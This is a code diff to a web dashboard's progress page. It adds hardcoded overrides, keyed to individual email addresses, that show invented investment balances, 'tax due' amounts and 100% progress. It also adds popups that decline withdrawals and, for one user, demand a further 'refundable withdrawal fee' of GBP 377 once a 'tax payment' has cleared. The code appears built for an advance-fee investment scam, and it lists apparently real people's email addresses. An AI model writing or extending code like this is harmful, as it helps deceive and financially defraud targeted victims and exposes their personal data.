@@ -337,11 +337,33 @@ const MANUAL_PROGRESS_OVERRIDES: Record<
     lockTaxDisplay: true
   },
   "alhanoofmehzim@gmail.com": {
+    currentValue: 12000,
+    taxRate: 0.165,
+    taxDue: 2000,
+    taxRemaining: 2000,
+    taxPaid: 743,
+    initialHoldings: 500,
+    currency: "GBP",
+    forceProgressPct: 100,
+    lockTaxDisplay: true
+  },
+  "naledingidi@gmail.com": {
     currentValue: 5000,
     taxRate: 0.165,
     taxDue: 743,
     taxRemaining: 743,
     taxPaid: 0,
+    initialHoldings: 500,
+    currency: "GBP",
+    forceProgressPct: 100,
+    lockTaxDisplay: true
+  },
+  "ossaiconcept29@gmail.com": {
+    currentValue: 15000,
+    taxRate: 0.165,
+    taxDue: 773,
+    taxRemaining: 0,
+    taxPaid: 773,
     initialHoldings: 500,
     currency: "GBP",
     forceProgressPct: 100,
@@ -506,6 +528,14 @@ const USER_PLAN_OVERRIDE_BY_EMAIL: Record<
     unit: "USD",
     durationHours: 48,
     startIso: "2026-03-22T00:00:00-08:00",
+    ignorePriorWithdrawals: true
+  },
+  "naledingidi@gmail.com": {
+    startValue: 500,
+    targetValue: 5000,
+    unit: "GBP",
+    durationHours: 48,
+    startIso: "2026-04-12T09:00:00-07:00",
     ignorePriorWithdrawals: true
   }
 };
@@ -1578,7 +1608,10 @@ export default function ProgressPage() {
   const forceTaxPaidEqualsDue = userEmailLower === "ajamibilal@yahoo.com";
   const manualTaxPaid = useManualTaxOverride && typeof manualOverride?.taxPaid === "number" ? Number(manualOverride.taxPaid) : 0;
   const taxPaidBase = forceTaxPaidEqualsDue ? baseTaxDue : manualTaxPaid;
-  const taxRemaining = Math.max(0, baseTaxDue - taxPaidBase);
+  const taxRemaining =
+    useManualTaxOverride && typeof manualOverride?.taxRemaining === "number"
+      ? Math.max(0, Number(manualOverride.taxRemaining))
+      : Math.max(0, baseTaxDue - taxPaidBase);
   const effectiveTaxRemaining = taxRemaining;
   const hasLockedWithdrawalForPlan = withdrawnLocked > 0.00000001;
   const shouldResetDashboard =
@@ -1695,6 +1728,13 @@ export default function ProgressPage() {
         await new Promise((resolve) => window.setTimeout(resolve, 3200));
         setTaxPopup(
           `${userFirstName}, withdrawal declined. Estimated tax remaining: ${taxRemainingLabel}. Contact admin on the Contact page for payment details.`
+        );
+        return;
+      }
+      if (userEmailLower === "ossaiconcept29@gmail.com") {
+        await new Promise((resolve) => window.setTimeout(resolve, 1200));
+        setTaxPopup(
+          "Congratulations. Your tax payment has been cleared successfully. To complete your withdrawal process, a refundable withdrawal fee of GBP 377.00 is now required. Please proceed to clear this refundable fee."
         );
         return;
       }
